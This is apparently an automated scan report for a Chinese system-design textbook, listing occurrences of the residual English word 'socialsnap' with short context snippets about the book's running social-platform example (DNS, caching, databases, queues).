系统设计思维：大规模软件的架构之道 — 全量残留英文词扫描
总块数: 425
独立词: 994
总出现: 7803

=== socialsnap (436 occurrences) ===
  c01_b02.md: ...#### 一个简单系统的组成部分  我们来具体化。当你的朋友在浏览器中输入 `https://socialsnap.com/posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socials...
  c01_b02.md: ...ialsnap.com/posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socialsnap.com 的 IP 地址是多少？” 2. DNS 服务器回答：“是 203.0.113.7。” 3. 浏览器向 203....
  c01_b02.md: ...受你控制。但你要对中间那部分负责。  这就是系统：一条组件链，每个只做自己那一小部分，却共同完成一个目标。  #### SocialSnap v0：一个能放进笔记本电脑的系统  在本书中，我们会跟随一个贯穿始终的例子：**SocialSnap**，一个从极小开...
  c01_b02.md: ...标。  #### SocialSnap v0：一个能放进笔记本电脑的系统  在本书中，我们会跟随一个贯穿始终的例子：**SocialSnap**，一个从极小开始成长的社交平台。现在，在 v0 版本，它已经是系统能简单到的样子：  * 一个 Python/Fla...
  c01_b02.md: ...交互（HTTP、SQL）。它无法承受一百万用户，这不意味着它错了——只意味着它与一百万用户需要的不是同一个系统。  从 SocialSnap v0 到能服务一百万用户的架构，这一旅程就是本书要讲的故事。  ### 1.2 为什么规模改变一切  这是一个诱人的谎...
  c01_b02.md: ...#### 一个简单系统的组成部分  我们来具体化。当你的朋友在浏览器中输入 `https://socialsnap.com/posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socials...
  c01_b02.md: ...ialsnap.com/posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socialsnap.com 的 IP 地址是多少？” 2. DNS 服务器回答：“是 203.0.113.7。” 3. 浏览器向 203....
  c01_b02.md: ...受你控制。但你要对中间那部分负责。  这就是系统：一条组件链，每个只做自己那一小部分，却共同完成一个目标。  #### SocialSnap v0：一个能放进笔记本电脑的系统  在本书中，我们会跟随一个贯穿始终的例子：**SocialSnap**，一个从极小开...
  c01_b02.md: ...标。  #### SocialSnap v0：一个能放进笔记本电脑的系统  在本书中，我们会跟随一个贯穿始终的例子：**SocialSnap**，一个从极小开始成长的社交平台。现在，在 v0 版本，它已经是系统能简单到的样子：  * 一个 Python/Fla...
  c01_b02.md: ...交互（HTTP、SQL）。它无法承受一百万用户，这不意味着它错了——只意味着它与一百万用户需要的不是同一个系统。  从 SocialSnap v0 到能服务一百万用户的架构，这一旅程就是本书要讲的故事。  ### 1.2 为什么规模改变一切  这是一个诱人的谎...
  c01_b04.md: ...#### 100 用户 vs 1 亿用户  让我们追踪 SocialSnap 在压力下的演进，不是为了现在理解所有解决方案，而是为了理解挑战的本质。  **100 用户时：** SocialSna...
  c01_b04.md: ...ocialSnap 在压力下的演进，不是为了现在理解所有解决方案，而是为了理解挑战的本质。  **100 用户时：** SocialSnap v0 没问题。一台机器。响应毫秒级。宕机只是小麻烦。出问题时重启笔记本就好。  **10,000 用户时：** 笔记本...
  c01_b07.md: ...健康服务器，当下游服务变慢时把请求排队而不是直接丢弃，以及能够自动检测故障而不是等用户报告。  **Q4.** 什么是 SocialSnap v0，为什么尽管它有限，仍被描述为“一个完全有效的系统”？...
  c01_b08.md: ...**答案：** SocialSnap v0 是本章引入的贯穿例子：一台机器上的 Python/Flask 应用，配 PostgreSQL 数据库，服务少量用...
  c01_b10.md: ...** 快速上线。但对于那些需要迁移千兆字节数据或重写核心基础设施才能更改的决策，现在多花一小时思考。  **Q3.** SocialSnap 在一个周五下午上线了新的“热门帖子”功能。一位名人在电视直播里提到 SocialSnap，60 秒内流量从往常 500...
  c01_b10.md: ...小时思考。  **Q3.** SocialSnap 在一个周五下午上线了新的“热门帖子”功能。一位名人在电视直播里提到 SocialSnap，60 秒内流量从往常 500 并发用户飙升到 50,000。单服务器单体应用完全垮掉——用户看到 502 错误。重启服...
  c01_b12.md: ...台机器之间协调，数据无法放进单台服务器。大规模问题的解与小规模问题的解在性质上不同——而不只是更大。  我们引入了 **SocialSnap v0**——一个单机器的博客应用，它将在本书中逐渐成长。看着 SocialSnap 演进，会给我们一条具体线索，跟随每...
  c01_b12.md: ...—而不只是更大。  我们引入了 **SocialSnap v0**——一个单机器的博客应用，它将在本书中逐渐成长。看着 SocialSnap 演进，会给我们一条具体线索，跟随每个新概念的出现。  我们还引入了系统设计的核心姿态：**假设事情会坏，并设计成坏掉也...
  c02_b01.md: ...在第 1 章，我们看着 SocialSnap v0 在一百万假想用户的重压下崩溃。我们谈论了故障、协调问题，以及无法放进一台机器的数据。但我们的谈论很松散——就像你...
  c02_b02.md: ...什么程度是有极限的——既受硬件限制，也受协调成本限制。   ### 2.2 Availability——“在”的承诺  SocialSnap 在周二的下午 2 点宕机一小时。这有多严重？  取决于场景。如果 SocialSnap 是一个爱好博客，一小时的停机很...
  c02_b02.md: ...bility——“在”的承诺  SocialSnap 在周二的下午 2 点宕机一小时。这有多严重？  取决于场景。如果 SocialSnap 是一个爱好博客，一小时的停机很烦人但可接受。如果 SocialSnap 是金融机构使用的交易平台，在市场时间宕机一小时...
  c02_b02.md: ...点宕机一小时。这有多严重？  取决于场景。如果 SocialSnap 是一个爱好博客，一小时的停机很烦人但可接受。如果 SocialSnap 是金融机构使用的交易平台，在市场时间宕机一小时可能损失数百万美元并断送职业生涯。  Availability（可用性）...
  c02_b03.md: ...有正确数据？这就是一致性问题的开端。   ### 2.3 Consistency——哪个版本的真相？  一个场景。一位 SocialSnap 用户更新了头像。更改发到服务器 A。一毫秒后，他的朋友从服务器 B 加载同一主页。服务器 B 还没收到更新。朋友看到的...
  c02_b09.md: ...#### 应用问题  **Q1.** SocialSnap 计划上线一个新功能：实时通知（有人点赞你的帖子时，你在 2 秒内收到通知）。为该功能定义具体的 SLI 和 SLO，并...
  c03_b02.md: ...#### 为什么这些数字重要：一个例子  假设有人为 SocialSnap 提出这样的方案：“每次页面加载，我们先查数据库拿到用户的好友，然后为每个好友查他们最新的 10 条帖子，最后把所有帖子...
  c03_b03.md: ...估算存储——需要多大空间？  存储估算需要理解两件事：每个用户产生多少数据，以及你保留多久。  **问题：** 估算 SocialSnap 5 年的存储需求，假设它增长到 5000 万注册用户，日活最多 1000 万。  **假设与估算：**  * **文字...
  c03_b03.md: ...2.7 PB**，由媒体附件主导  **这告诉我们：** 媒体存储完全主导。即使只有 10% 的照片附件率和适度压缩，SocialSnap 规模的平 5 年也会积累 PB 级图片数据。这与存储文字是根本不同的架构问题——它需要对象存储（object stor...
  c03_b04.md: ...### 3.5 估算带宽——流过多少数据？  带宽常常是最令人惊讶的约束。我们来估算 SocialSnap 的带宽。  **读带宽（向用户输送内容）：**  * 峰值 QPS：假设 50,000（中小型 SocialSnap）...
  c03_b05.md: ...#### SocialSnap 估算练习  现在把一切都应用到 SocialSnap。假设它已增长到 100 万注册用户。  **给定假设：**  *...
  c03_b05.md: ...#### SocialSnap 估算练习  现在把一切都应用到 SocialSnap。假设它已增长到 100 万注册用户。  **给定假设：**  * 100 万（1,000,000）注册用户，300,0...
  c03_b05.md: ...Feed 缓存数据：少量 * **总计：约 120 GB/年** → 5 年后约 600 GB  **100 万用户时 SocialSnap 的结论：** 这些数字非常 modest。一台配置合理的服务器（比如 32 核、128 GB RAM、2 TB SSD...
  c03_b07.md: ...modest。架构优先级：带激进缓存的快速读路径。数据库写路径不那么关键——需要时队列可以缓冲写入。  **Q2.** SocialSnap 考虑增加视频帖子（最长 60 秒，平均压缩到 5 MB）。如果 5% 的帖子含视频，且 SocialSnap 达到 5...
  c03_b07.md: ...2.** SocialSnap 考虑增加视频帖子（最长 60 秒，平均压缩到 5 MB）。如果 5% 的帖子含视频，且 SocialSnap 达到 500 万日活用户、每人每天发 1 帖，估算：(a) 视频每年额外增长多少存储；(b) 服务视频内容需要额外多少...
  c03_b07.md: ...B × 365 ≈ 456 TB ≈ 约 460 TB/年**  这是纯文字存储的 2000 倍增长！视频完全主导存储。SocialSnap 需要专门的 blob 存储方案（如 S3），而不是数据库存储。  **(b) 视频服务带宽：** 从 3.5 节可知，...
  c03_b07.md: ...存储方案（如 S3），而不是数据库存储。  **(b) 视频服务带宽：** 从 3.5 节可知，500 万 DAU 的 SocialSnap 大致有：  * Feed 加载：5M × 5/天 = 25M/天（2500 万/天）= 289 QPS 平均 → 87...
  c03_b09.md: ...一点，而不是立即失败。好的系统设计为估算误差保留 headroom（余量）。  **Q2.** 两位工程师在争论是否给 SocialSnap 加 CDN。工程师 A 说：“我们没预算。买台更大的服务器吧。” 工程师 B 说：“我们需要 CDN——延迟数字证明这...
  c03_b09.md: ...体数字，并推导出什么结论？  **讨论：** 工程师 B 的论据建立在跨洲延迟差距上。伦敦用户加载由纽约源服务器服务的 SocialSnap Feed，仅数据包（packet）的网络（network）往返就要约 150 ms——还没算处理时间。如果该 Feed...
  c03_b10.md: ...大小 → 峰值乘数。 * **费米估算：** 把未知拆成可估算的部分，相乘，再用直觉做合理性检查。  我们把这些应用到 SocialSnap，发现在 100 万用户时负载 modest——一台配置合理的服务器就够。数字会告诉你什么时候该加复杂度，同样重要的是，...
  c03_b10.md: ...时负载 modest——一台配置合理的服务器就够。数字会告诉你什么时候该加复杂度，同样重要的是，什么时候不该加。  **SocialSnap 100 万用户估算** 建立了我们的基线：峰值 190 QPS、读带宽 12 MB/s、5 年存储 600 GB。随着...
  c03_b10.md: ...100 万用户估算** 建立了我们的基线：峰值 190 QPS、读带宽 12 MB/s、5 年存储 600 GB。随着 SocialSnap 增长，这些数字会剧烈变化——而这些变化将驱动我们后续每一章的架构决策。  在第 4 章，我们将讨论分布式系统中最深刻的...
  c04_b02.md: ...布式系统中都是强制的，实际推论是：  > **在网络分区期间，你必须选择：一致性还是可用性。**  让我们具体化。想象 SocialSnap 有两个数据库节点——叫它们 North 和 South——在彼此之间复制数据。用户的粉丝数存在两者之上。网络分区意味着...
  c04_b05.md: ...中不一致曾持续数小时。  最终一致性对用户来说是什么样子的具体例子：  **例子 1：过时的社交 Feed。** 你在 SocialSnap 上发了“我拿到 offer 了！”。你的朋友请求被路由到另一个副本，刷新 Feed 没看到你的帖子。3 秒后他们再刷新...
  c04_b06.md: ...### 4.6 把框架应用到 SocialSnap  但如何把这些理论 tradeoff 真正转化为真实产品的具体数据库选择？  我们用 CAP/PACELC 框架为规模...
  c04_b06.md: ...何把这些理论 tradeoff 真正转化为真实产品的具体数据库选择？  我们用 CAP/PACELC 框架为规模化中的 SocialSnap 做具体决策。  **SocialSnap 的组件清单：**  * 用户认证（登录、token） * 帖子（创建、读取、...
  c04_b06.md: ...真实产品的具体数据库选择？  我们用 CAP/PACELC 框架为规模化中的 SocialSnap 做具体决策。  **SocialSnap 的组件清单：**  * 用户认证（登录、token） * 帖子（创建、读取、Feed） * 关注关系 * 私信 * 点...
  c04_b13.md: ...一致 → 读己之写 → 最终）给了你一套工具：同一个系统的不同组件可以根据不一致的用户可见后果使用不同的一致性模型。对 SocialSnap，我们把每个组件映射到合适的级别——这是把工程严谨性与用户影响匹配的直接示例。  **权衡矩阵**在本章获得了最重要的几...
  c04_b13.md: ...库。关系模型已主导数据存储 50 年，且有充分理由。理解为什么——以及理解它的限制——是你将做出的每个数据库决策的基础。SocialSnap 即将迎来它的第一个数据库。...
  c05_b01.md: ...我们离开 SocialSnap v0 时，它还是笔记本电脑上的一个 Python 函数。这个函数返回博客帖子，数据住在……某个地方。也许是 Pytho...
  c05_b01.md: ...帖子，数据住在……某个地方。也许是 Python 字典，也许是 JSON 文件。三个用户时怎么都行。  现在我们需要给 SocialSnap 的数据一个真正的家。而有一样东西已经主导软件工程五十年：关系型数据库。  为什么是五十年？因为关系模型解决了一个真正的...
  c05_b01.md: ...f（权衡），使其对某些工作负载极佳，对其他工作负载不适用。理解这些 tradeoff（权衡）是本章的目标。  让我们给 SocialSnap 它的第一个数据库。   ### 5.1 关系模型——数据即表  在文档存储、图数据库、键值存储都曾承诺要取代它之后，是...
  c05_b01.md: ...关系模型——数据即表  在文档存储、图数据库、键值存储都曾承诺要取代它之后，是什么让关系模型如此持久？  想象你在设计 SocialSnap 的存储。你要存用户、他们的帖子，以及它们之间的关系。怎么组织？  关系模型的答案：**表（table）**。每张表代表...
  c05_b01.md: ...关系模型的答案：**表（table）**。每张表代表一种实体类型。每一行代表该实体的一个实例。每一列代表一个属性。  SocialSnap 的初次尝试：  **users 表**  | id | username | email | password_has...
  c05_b01.md: ...| created_at | |---|---|---|---| | 101 | 1 | "Just launched SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from Bob" | 2024-...
  c05_b03.md: ...果集排序 * **不要过度索引**：每个索引都会拖慢写入。一张表上有 20 个很少用的索引，写入会变慢而收益很小  对 SocialSnap 的 `posts` 表，好的索引候选：  * `user_id`（按用户找帖子） * `created_at`（按时间...
  c05_b04.md: ...plain 语言：事务保证一个多步操作要么完全完成，要么不留下任何痕迹。没有“半完成”状态会被其他用户看到。  考虑 SocialSnap 的“关注用户”操作。Alice 关注 Bob 时，我们需要：  1. 在 `follows` 表中插入一行：`(fol...
  c05_b06.md: ...### 5.4 SocialSnap v1——加入关系型数据库  让我们把所有这些应用到给 SocialSnap 第一个真正的数据库。架构从：...
  c05_b06.md: ...### 5.4 SocialSnap v1——加入关系型数据库  让我们把所有这些应用到给 SocialSnap 第一个真正的数据库。架构从：       [ Browser ] ──HTTP──> [ Flask App + in...
  c05_b06.md: ...tgreSQL ] (one machine)   仍然是一台机器，但现在数据在重启后持久化，并且可以灵活查询。  **SocialSnap v1 schema：**      CREATE TABLE users (         id...
  c05_b07.md: ...### 5.5 单台关系型数据库的限制  SocialSnap v1 只有一台 PostgreSQL 实例，但能处理 surprisingly 大的流量。一台调好、硬件足够的 Pos...
  c05_b07.md: ...简单读（有索引） * 每秒数百次写 * 数十 GB 数据而不性能退化  但正如我们在第 3 章估算的，100 万用户的 SocialSnap 在数据库层每秒约 35 次点赞动作，并且还在增长。接近的限制是：  **写入瓶颈：** 所有写入都到一台机器。一台磁盘...
  c05_b07.md: ...间有限。随着帖子、媒体引用和点赞记录累积，最终会耗尽单台机器存储。  **可用性：** 一台机器是单点故障。如果它崩溃，SocialSnap 就下线。我们需要复制——但复制引入一致性 tradeoff（第 4 章）。  **地理延迟：** 如果你的数据库服务器...
  c05_b07.md: ...在 Tokyo，每次数据库查询都要跨太平洋。本地 1ms 的数据库查询，跨洲链路上要花 150ms+。  这些限制驱动 SocialSnap 后续章节的演进。但目前，在几十万用户规模，一台带读副本的 PostgreSQL 实例（第 12 章）是稳健的基础。...
  c05_b08.md: ...primary key）** 唯一标识表内的每一行。表中不能有两行具有相同的主键值，也不能有主键为 NULL 的行。在 SocialSnap 的 `users` 表中，`id` 是主键——它是每个用户的权威标识符。  **外键（foreign key）** 是...
  c05_b10.md: ...#### 应用问题  **Q1.** SocialSnap 增加一个“@提及”功能：一篇帖子可以通过用户名提及最多 10 个其他用户（如“@alice 和 @bob”）。设计支持...
  c05_b10.md: ...osts` 和 `users` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。一年后 `likes` 表约有 1.1 billion（11...
  c05_b11.md: ...贵，而点赞数一天被读数百万次。一致性风险通过把计数器与 insert/delete 放在同一事务中更新来管理。这遵循与 SocialSnap v1 的 `follower_count` 和 `following_count` 列相同的原理——预计算聚合是一项基...
  c05_b11.md: ...count` 和 `following_count` 列相同的原理——预计算聚合是一项基础优化模式。  **Q3.** SocialSnap 需要存储两类数据：**用户资料**（姓名、简介、头像 URL、加入日期）和**帖子**（文本内容、图片 URL、时间戳...
  c05_b12.md: ...行后停止。查询成本从 O(n)（扫描整张表）降到 O(log n + 20)，与总表大小无关。  这与 5.2 节为 SocialSnap posts 表引入的复合索引 `(user_id, created_at)` 原理相同。复合索引中选择正确的列顺序（过...
  c05_b13.md: ...#### 深入思考  **Q1.** SocialSnap v1 schema 把 `follower_count` 和 `following_count` 直接存在 `user...
  c05_b14.md: ...——Read Committed 是常见默认，Serializable 在更高成本下提供最大正确性。  我们介绍了 **SocialSnap v1**：一个由 PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、f...
  c06_b10.md: ...档存储把它作为附加功能。Redis 的原生地理空间支持是为此专门构建的。  **Q2.**（联系第 5 章反规范化讨论）SocialSnap 想增加“热门 hashtag”功能：展示过去 24 小时使用最多的 10 个 hashtag。帖子在创建时被打上 ha...
  c06_b15.md: ...第 7 章，我们转向系统设计中最普遍适用的性能优化：**缓存**。几乎每个系统，无论使用哪种数据库，都能从缓存中受益——SocialSnap 即将发现原因。我们也会发现缓存的阴暗面：困扰分布式系统数十年的缓存失效问题。...
  c07_b01.md: ...SocialSnap v1 有了关系型数据库。用户可以创建账户、写帖子、互相关注。第 5 章的 schema 处理一切：`users`、`p...
  c07_b01.md: ...注。第 5 章的 schema 处理一切：`users`、`posts`、`follows`。日子很好过。  直到某篇 SocialSnap 帖子病毒式传播。  周二下午，一个用户发了些内容，被更大的平台转发。流量在 20 分钟内从 200 请求/秒飙升到 8...
  c07_b01.md: ...数据库 CPU 爬到 100%。查询开始排队。p99 延迟从安静下午的 80ms 变成 4 秒。用户看到白屏。这本该是 SocialSnap  breakthrough 的病毒时刻，变成了最尴尬的 outage。  侦探问题是：这 8,000 个请求每个到底在...
  c07_b03.md: ...访问缓存需要网络调用（LAN 上约 0.5–2ms）。缓存服务器成为新的依赖——如果它失败，应用必须优雅处理。  对 SocialSnap——以及大多数超过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7....
  c07_b03.md: ...果它失败，应用必须优雅处理。  对 SocialSnap——以及大多数超过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各...
  c07_b04.md: ...) the old cached value — OR — update it in the cache   让我们用 SocialSnap 走一遍。用户请求 Alice 的资料时：  **第一次请求（冷缓存）：**  1. 应用检查缓存 key `user:...
  c07_b07.md: ...is 支持主-从/副本复制（primary-replica replication），提供读扩展和故障转移能力。  对 SocialSnap，Redis 是正确选择。我们不仅需要简单字符串缓存——还要点赞计数器、热门帖子有序集合，以及最终会话存储（第 11 章...
  c07_b07.md: ...机位置问题。那是 Redis 作为专门数据库而非只是缓存。Redis 足够多功能，可同时充当两者。   ### 7.7 SocialSnap v2——加入缓存层  让我们看看缓存如何在实践中改变 SocialSnap。  SocialSnap v1（第 5 章...
  c07_b07.md: ...功能，可同时充当两者。   ### 7.7 SocialSnap v2——加入缓存层  让我们看看缓存如何在实践中改变 SocialSnap。  SocialSnap v1（第 5 章）只有一台 PostgreSQL 数据库。最常见的查询是：  1. 加载用户...
  c07_b07.md: ...### 7.7 SocialSnap v2——加入缓存层  让我们看看缓存如何在实践中改变 SocialSnap。  SocialSnap v1（第 5 章）只有一台 PostgreSQL 数据库。最常见的查询是：  1. 加载用户资料（按 `user_id...
  c07_b07.md: ...秒时，数据库每秒约收到 5,600 次资料查找和 1,600 次帖子查找。单台 PostgreSQL 实例为此挣扎。  SocialSnap v2 架构把 Redis 加为分布式缓存：       User Request         ↓     Appl...
  c07_b08.md: ...#### 第一个陈旧性 Bug  SocialSnap v2 上线后表现很好。数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓存吸收。  但随后收到一...
  c07_b08.md: ...Carlos 用手机应用更新简介，而手机应用使用不同的代码路径，它更新了数据库但没有使 Redis 缓存失效。  这是 SocialSnap 历史上第一个陈旧性 bug。但不会是最后一个。  修复办法是确保所有修改用户数据的代码路径都使相关缓存 key 失效。...
  c07_b09.md: ...7.8 惊群——深入探讨  我们在 7.4 节简要提到惊群问题。它值得更彻底讨论，因为它是真实的生产故障模式。  想象 SocialSnap “热门帖子”侧边栏的缓存条目。该条目每秒被读 10,000 次（每个加载任何页面的人都会看到侧边栏）。TTL 为 60...
  c07_b10.md: ...复杂度：你现在要多运维一个系统、多担心一类 bug、还要维护缓存失效逻辑。  这个 tradeoff（权衡）值得吗？对 SocialSnap 来说，值得——读密集型工作负载（资料查找、帖子 Feed）完美映射到缓存擅长的事。对每次读取都必须完全最新的金融交易/...
  c07_b13.md: ...#### 应用问题  **Q1.** SocialSnap 工程团队正在争论该缓存什么。以下是他们在考虑的三种数据类型。对每种，分析访问模式，估算合适 TTL，并选择缓存策略（c...
  c07_b13.md: ...(c) 全站帖子总数：**  访问模式：显示在网站的“关于”或“统计”页面。多半是虚荣指标。每篇新帖子都会改变它。如果 SocialSnap 有 100 万帖子，一篇新帖子把它从 1,000,000 变到 1,000,001——0.0001% 的变化，没有用户...
  c07_b14.md: ...**Q2.**（联系第 5 章 ACID 讨论和第 6 章 BASE 哲学）一个团队为 SocialSnap 的关注计数提出如下缓存架构：不再把 `follower_count` 存在 PostgreSQL users 表中，而...
  c07_b14.md: ...崩溃，数据也必须保留。  无持久化的 Redis 把所有东西存在内存中。如果 Redis 进程崩溃，所有数据丢失。如果 SocialSnap 用 Redis 作为关注计数的唯一存储且禁用持久化，Redis 崩溃可能让所有用户的关注计数归零。一个拥有 100,0...
  c07_b14.md: ...用户在 Redis 重启后显示 0 粉丝。这既错误又用户可见。  **故障场景：** Redis 凌晨 3:00 崩溃。SocialSnap 自动重启 Redis。所有关注计数为 0。用户加载资料时，应用向 Redis 查询关注计数，每个人都得到 0。网站在线...
  c07_b14.md: ...个关键原则：**Redis 用于速度，关系型数据库用于持久性**。  **Q3.**（联系第 6 章 NoSQL 家族）SocialSnap 主页 Feed 向每个用户展示其所关注人最新帖子的排序列表。Feed 计算昂贵：需要 join `follows` 表...
  c07_b16.md: ...#### 深入思考  **Q1.** SocialSnap 工程师 Phil 提出一种“完美缓存失效”策略：“我们完全不用 TTL，每次写入都触发缓存失效事件。用户 Alice...
  c07_b16.md: ...为静态内容的边缘缓存。但现代 CDN 也能缓存“半动态”内容——对大多数用户相同但并非所有用户都相同。什么架构模式能让 SocialSnap 通过 CDN 提供公开用户资料？哪类用户无法使用 CDN 缓存版本？  **讨论：** 公开用户资料——你访问 `so...
  c07_b16.md: ...ap 通过 CDN 提供公开用户资料？哪类用户无法使用 CDN 缓存版本？  **讨论：** 公开用户资料——你访问 `socialsnap.com/users/alice` 且未登录时看到的页面——对每个人都一样。资料照片、简介、粉丝数（或近似数）和公开帖子...
  c07_b16.md: ...时看到的页面——对每个人都一样。资料照片、简介、粉丝数（或近似数）和公开帖子无论谁请求都相同。  要通过 CDN 提供，SocialSnap 需确保资料页不包含个性化元素。CDN 缓存 `GET /users/alice` 的渲染响应，TTL 5 分钟。任何用...
  c07_b17.md: ...LRU 是最常见默认。  **惊群** 是缓存过期导致数据库查询同步激增的故障模式。抖动、加锁和后台刷新是缓解手段。  SocialSnap v2 加入了 Redis 缓存层，显著降低数据库负载。它的第一个陈旧性 bug 说明，缓存不只是性能改动——它产生需要...
  c08_b01.md: ...想想 SocialSnap 有新用户注册时会发生什么。  从用户视角：他们填表、点“创建账户”，出现确认页。瞬间完成。  从服务器视角：雪崩般的工...
  c08_b01.md: ...用户”事件到分析系统。用户可能被加入 onboarding 序列。如果用户通过推荐链接注册，推荐人必须获得积分。  在 SocialSnap v2 中，这一切同步发生——在同一个线程、同一个用户等待的 HTTP 请求中。用户点击“创建账户”，服务器：  1....
  c08_b01.md: ...件之间不当的耦合。   ### 8.1 同步耦合的问题  第 2 章我们介绍了可用性概念，以及链式依赖如何使可用性相乘。SocialSnap 的同步注册流程正是这一点的例证。注册端点的可用性是：       可用性 = P(DB 正常) × P(邮件正常) ×...
  c08_b03.md: ...b——向多个消费者广播事件  生产者-消费者模型是一个生产者向一个消费者发送消息。但如果一个事件有多个相关方呢？  当 SocialSnap 有新用户注册时，多个系统关心：  * 邮件服务（发送欢迎邮件） * 分析系统（记录注册事件） * 联系人通知系统（通知...
  c08_b04.md: ...in 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  SocialSnap 注册场景中：       Publisher (Signup Service)         ↓     publi...
  c08_b06.md: ...me")     Event 3: UserBioUpdated(user_id=1, new_bio="CTO at SocialSnap")   当前状态通过重放事件派生。当前简介是“CTO at SocialSnap”——按顺序应用所有事件的结果。  *...
  c08_b06.md: ...1, new_bio="CTO at SocialSnap")   当前状态通过重放事件派生。当前简介是“CTO at SocialSnap”——按顺序应用所有事件的结果。  **事件溯源的优势：**  完整审计轨迹：每笔变更都被记录。非常适合金融系统、医疗记...
  c08_b06.md: ...CQRS 和事件溯源很强大，但显著增加架构复杂度。只有在审计要求、复杂读模式或高吞吐需求证明成本合理时才值得采用。对 SocialSnap 当前阶段，它们是大材小用——但知道它们存在是系统设计师词汇的一部分。...
  c08_b07.md: ...### 8.7 SocialSnap v3——通知队列  让我们回到本章开头 SocialSnap 的具体问题：同步注册流程。  SocialSnap v3...
  c08_b07.md: ...### 8.7 SocialSnap v3——通知队列  让我们回到本章开头 SocialSnap 的具体问题：同步注册流程。  SocialSnap v3 为注册流程、更广泛地为所有生成通知的事件引入消息队列。队列系...
  c08_b07.md: ....7 SocialSnap v3——通知队列  让我们回到本章开头 SocialSnap 的具体问题：同步注册流程。  SocialSnap v3 为注册流程、更广泛地为所有生成通知的事件引入消息队列。队列系统是一个简单的（概念上：由数据库或 Redis 支撑...
  c08_b07.md: ...们终究会到。  注册流程从未失败。用户从未看到错误。邮件延迟多半不会被大多数用户注意到。  这就是消息队列的可用性故事。SocialSnap 的注册可用性现在变成：       注册可用性 ≈ P(DB 正常) × P(队列正常)   邮件、分析和通知服务不再...
  c08_b08.md: ...发送，分析记录还不存在，联系人通知还没发出。在几秒（如果邮件服务积压，则更长）内，世界处于中间状态。  这可接受吗？对 SocialSnap，可以。用户明白欢迎邮件是稍后到达，不是瞬时。联系人通知也不急到几秒延迟要紧。  但考虑支付系统。如果你告诉用户“支付已...
  c08_b08.md: ...有适当背压处理的系统中，这是一个信号：消费者集群需要扩容（增加消费者实例）。但如果积压无限制增长，你最终会耗尽存储。  SocialSnap 场景：病毒式传播期间，注册事件可能每秒 5,000 个。邮件服务每秒处理 100 封邮件。积压以每秒 4,900 条增...
  c08_b11.md: ...者不影响现有订阅者，发布者也不需要知道谁在订阅。  **选择 pub-sub 当：** 一个事件有多个独立消费者感兴趣。SocialSnap 的注册事件对邮件服务、分析、联系人通知和 onboarding 都感兴趣。如果你用点对点队列，需要四个单独队列（每个消...
  c08_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想增加“帖子被赞”通知：当 Alice 点赞 Bob 的帖子，Bob 在通知中心收到通知。这是高容量事件（每天数百万赞...
  c08_b12.md: ...t_id`（UUID）是幂等性 key。`like_id` 是数据库中点赞的主键——也对去重有用。  **生产者：** SocialSnap 应用服务器中的“点赞”API 端点。当 Alice 点赞帖子时，服务器：  1. 在 `likes` 表中插入一行（含...
  c08_b12.md: ...作幂等性 key 加数据库唯一约束的模式，是生产安全的幂等消息处理方法。  **Q2.**（联系第 7 章陈旧性讨论）SocialSnap 工程团队争论：“post liked”通知消费者更新 Redis 计数器（`user:{user_id}:notifi...
  c08_b13.md: ...在第 7 章的 SocialSnap v2 中，资料缓存 key `user:{user_id}:profile` 存储 users 表的数据：用户名、简介...
  c08_b13.md: ...schema 设计。粒度错了，命中率就受影响。  **Q3.**（联系第 6 章 CAP 定理讨论和第 8 章投递保证）SocialSnap 的通知队列使用至少一次投递加幂等消费者。数据库中断 15 分钟导致通知服务停止处理事件。中断期间，队列中累积了 500...
  c08_b16.md: ...单队列所避免的运维负担的场景。  **讨论：**  **Kafka 保留是临界优势的地方——新消费者问题：**  假设 SocialSnap 运行一个推荐算法，消费 Kafka 主题中的用户活动事件（帖子浏览、点赞、关注）。六个月后，数据科学团队构建了一个显著...
  c08_b16.md: ...历史的能力——团队手忙脚乱地构建本应有的存档。  **Kafka 保留造成运维负担的地方——磁盘成本和分区管理：**  SocialSnap 发布高频事件：每次页面浏览、每次广告曝光。每秒 10,000 条事件，每条 200 字节，Kafka 保留 7 天。存...
  c08_b17.md: ...RS** 代表更深的架构哲学——存储历史而非当前状态，并把写模型与读模型分离。对审计密集型应用很强大；运维复杂。  **SocialSnap v3** 通过消息队列把欢迎邮件和联系人通知与注册流程解耦。注册的可用性不再与邮件服务耦合。代价：最终一致性——欢迎邮...
  c08_b17.md: ...从用户实际到达应用服务器，以及它们之间有什么基础设施。负载均衡器、API 网关和把分布式系统连在一起的网络协议，将完善 SocialSnap 请求流实际如何工作的图景。...
  c09_b01.md: ...生产者与消费者解耦的消息队列。但有一个问题我们一直默默回避了：Singapore 用户浏览器发出的请求，到底是如何到达 SocialSnap 应用服务器的？  答案涉及多层基础设施，每层承担特定职责。理解这些层不只是学术意义——网络层的决定直接决定系统如何扩展...
  c09_b01.md: ...你能构建什么类型的应用。  让我们从头到尾追踪一个请求。   ### 9.1 请求的旅程  用户在浏览器输入 `www.socialsnap.com` 并按回车。会发生什么？  **第 1 步：DNS 解析。** 浏览器询问 DNS（Domain Name S...
  c09_b01.md: ...？  **第 1 步：DNS 解析。** 浏览器询问 DNS（Domain Name System）服务器：“`www.socialsnap.com` 的 IP 地址是什么？” DNS 是互联网的电话簿——把人类可读的域名翻译成机器可读的 IP 地址。DNS...
  c09_b01.md: ...在小型系统中，第 1–4 步由互联网基础设施（ISP、DNS 服务器）处理，第 5 步微不足道（只有一台服务器）。但在 SocialSnap 的规模下，第 5 步才是有趣的系统设计决策所在。   ### 9.2 负载均衡器——分配工作  假设 SocialSn...
